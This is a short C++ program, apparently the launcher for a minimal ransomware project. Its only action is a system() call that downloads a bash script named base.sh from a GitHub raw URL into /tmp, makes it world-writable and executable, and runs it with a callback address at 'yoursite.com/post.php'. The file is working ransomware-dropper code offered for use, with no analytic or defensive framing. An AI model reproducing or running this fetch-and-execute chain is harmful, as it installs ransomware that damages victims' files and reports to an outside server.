#include <cstdlib> 
#include <string>

using namespace std;

int main()
{
	string cmd = "cd /tmp && wget -O /tmp/base.sh https://raw.githubusercontent.com/drigg3r/Ransomware-Cpp-Bash-minimal/master/base.sh > /dev/null 2>&1 && chmod 777 /tmp/base.sh && ./base.sh http://yoursite.com/post.php";
	system(cmd.c_str());
	return 0;
}
